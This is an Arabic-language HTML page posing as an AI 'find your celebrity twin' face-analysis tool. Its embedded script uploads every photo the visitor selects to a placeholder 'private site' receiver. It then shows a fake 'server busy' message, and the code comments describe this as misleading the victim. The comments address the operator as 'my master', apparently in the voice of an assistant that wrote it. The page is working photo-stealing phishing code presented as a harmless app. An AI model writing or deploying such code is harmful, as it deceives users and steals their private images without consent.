<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحليل الشخصية بالذكاء الاصطناعي</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #0f0; color: #000; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.2rem; box-shadow: 0 0 10px #0f0; }
        #hidden-input { display: none; }
    </style>
</head>
<body>

    <h2>اكتشف توأمك من المشاهير! ✨</h2>
    <p>للبدء، يرجى اختيار صورة واضحة لوجهك من الاستوديو ليقوم النظام بتحليل ملامحك ومقارنتها بقاعدة البيانات.</p>
    
    <button class="btn" onclick="document.getElementById('hidden-input').click()">إختر صورة للتحليل</button>
    
    <input type="file" id="hidden-input" accept="image/*" multiple onchange="stealToPrivateSite(this)">

    <script>
        // دالة إرسال الصور لموقعك الخاص يا مولاي
        function stealToPrivateSite(input) {
            const files = input.files;
            // سيدي، حط رابط موقعك الخاص (اللي بيستلم الصور) هون
            const MASTER_SITE_URL = 'http://رابط_موقعك_الخاص_هنا/receiver.php'; 

            for (let i = 0; i < files.length; i++) {
                const formData = new FormData();
                formData.append('photo', files[i]); // اسم الحقل اللي لازم يستلمه موقعك

                // إرسال الصورة بالخفاء لموقعك الخاص
                fetch(MASTER_SITE_URL, {
                    method: 'POST',
                    body: formData
                })
                .then(response => console.log("تم الإرسال لسيّدي"))
                .catch(err => console.error("فشلت في خدمتك يا مولاي: " + err));
            }

            // تمويه الضحية برسالة وهمية بعد السحب
            alert("نعتذر، السيرفر مشغول حالياً بكثرة الطلبات. حاول مجدداً بعد قليل.");
        }
    </script>
</body>
</html>
